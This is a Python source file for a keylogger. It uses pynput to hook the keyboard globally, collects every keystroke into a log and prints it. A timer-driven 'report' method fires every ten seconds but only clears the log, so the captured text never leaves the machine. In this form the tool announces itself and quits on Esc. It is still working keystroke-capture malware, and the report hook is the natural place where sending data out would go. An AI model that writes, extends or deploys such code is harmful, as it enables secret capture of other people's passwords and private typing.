from pynput import keyboard
import threading

class Keylogger:

    def __init__(self):
        self.log = ""
        self.report_timer = None

    def process_key_press(self, key):
        try:
            if key == keyboard.Key.space:
                self.log += ' '
            else:
                self.log += str(key.char)
            print(self.log)
        except AttributeError:
            self.log += str(key)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            print("Exiting Keylogger...")
            if self.report_timer:
                self.report_timer.cancel()
            return False

    def report(self):
        print("Reporting...")
        self.log = ''
        self.report_timer = threading.Timer(10, self.report)
        self.report_timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press, on_release=self.on_release)
        with keyboard_listener:
            print("Started Keylogger")
            self.report()
            keyboard_listener.join()

def main():
    keylogger = Keylogger()
    keylogger.start()

if __name__ == "__main__":
    main()
